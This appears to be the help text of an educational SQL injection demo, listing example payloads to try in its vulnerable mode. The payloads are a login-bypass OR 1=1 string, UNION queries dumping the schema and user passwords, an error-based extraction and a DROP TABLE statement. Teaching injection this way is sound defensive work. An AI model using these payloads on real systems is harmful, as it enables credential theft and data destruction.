Try These Injection Examples (in Vulnerable Mode):

            
    
                
  • Bypass login/search: ' OR 1=1 -- (finds all products)
    • 
                
  • Union attack (reveal other tables): ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' -- (shows database schema)
    • 
                
  • Union attack (reveal data from other table): ' UNION SELECT username, password FROM users -- (assuming a 'users' table exists with 'username' and 'password' columns. *Note: this demo only has a 'products' table, so it won't work perfectly, but illustrates the concept*)
    • 
                
  • Error-based injection: ' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT) -- (might cause a type conversion error, revealing schema info in the error message)
    • 
                
  • Stacked queries (not typically supported in `SELECT` statements with SQLite via `sql.js` directly, but demonstrates intent): '; DROP TABLE products; -- (This won't work as a *search input* for a `SELECT` query, but shows what an attacker *might* try if the context allowed multiple statements.)
    • 
                
  • Find specific product or all: ' OR name LIKE '%a%' -- (finds all products containing 'a')
    • 
            

            
Observe the "Executed SQL Query" section closely in both modes!
